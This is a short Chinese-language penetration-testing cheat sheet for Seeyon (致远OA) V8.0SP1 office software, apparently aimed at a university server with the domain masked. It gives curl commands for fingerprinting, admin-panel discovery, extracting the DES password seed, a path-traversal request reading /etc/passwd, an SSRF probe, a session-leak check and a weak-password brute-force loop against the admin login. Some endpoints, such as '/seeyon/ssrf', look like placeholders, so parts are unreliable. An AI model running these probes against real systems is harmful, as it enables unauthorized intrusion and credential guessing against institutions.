# 致远OA (Seeyon) 漏洞测试模式

## 识别特征
- URL: `http://oa.XXX.edu.cn/seeyon/index.jsp`
- 标题: `XXX协同办公平台 V8.0SP1`
- CSS/JS路径含版本: `/seeyon/common/all-min.css?V=V8_0SP1_201101_29551`
- favicon: `/seeyon/common/images/A8/favicon.ico`
- 密码加密: CryptoJS.DES.encrypt, 种子 `_SecuritySeed`
- 产品ID: `seeyonProductId="1"` (A8)

## 版本检测
```bash
# 从标题获取版本
curl -sk "http://oa.XXX.edu.cn/seeyon/index.jsp" | grep -oP '<title>[^<]+</title>'
# 返回: <title>XXX协同办公平台 V8.0SP1</title>

# 从CSS路径获取详细版本号
curl -sk "http://oa.XXX.edu.cn/seeyon/index.jsp" | grep -oP 'V=[^"&]+'
# 返回: V=V8_0SP1_201101_29551
```

## 管理后台
```bash
# 管理后台入口
curl -sk "http://oa.XXX.edu.cn/seeyon/management/index.jsp" -D-
# 返回200 = 管理后台存在

# 管理后台登录
curl -sk -X POST "http://oa.XXX.edu.cn/seeyon/management/login.jsp" \
  -d "managerPassword=PASSWORD"
# 注意: 部分服务器返回 "java.lang.IllegalStateException: 提交响应后无法创建会话"
# 这是服务器端Session创建问题，不是漏洞
```

## 密码加密分析
```bash
# 获取加密种子
curl -sk "http://oa.XXX.edu.cn/seeyon/index.jsp" | grep _SecuritySeed
# 返回: var _SecuritySeed = '366643254';

# 密码加密方式: CryptoJS.DES.encrypt(password, seed)
# 前台登录表单: login_username, login_password
# 加密后提交: login_password = CryptoJS.DES.encrypt(us, _SecuritySeed)
```

## 已知漏洞测试
```bash
# Session泄露(部分版本)
curl -sk "http://oa.XXX.edu.cn/seeyon/management/index.jsp" -D- | grep -i jsessionid

# 文件包含(部分版本)
curl -sk "http://oa.XXX.edu.cn/seeyon/download?file=../../../etc/passwd"

# SSRF(部分版本)
curl -sk "http://oa.XXX.edu.cn/seeyon/ssrf?url=http://127.0.0.1:8080"

# 弱口令测试(管理后台)
for pass in 123456 admin admin123 admin888 password seeyon; do
  curl -sk -X POST "http://oa.XXX.edu.cn/seeyon/management/login.jsp" \
    -d "managerPassword=${pass}"
done
```

## 注意事项
- 致远OA管理后台Session创建可能抛出Java异常，这是服务端问题
- 密码使用DES加密，需获取种子后才能构造登录请求
- 不同版本(V5/V8/A6/A8)漏洞不同
- 管理后台和前台登录是独立的认证系统
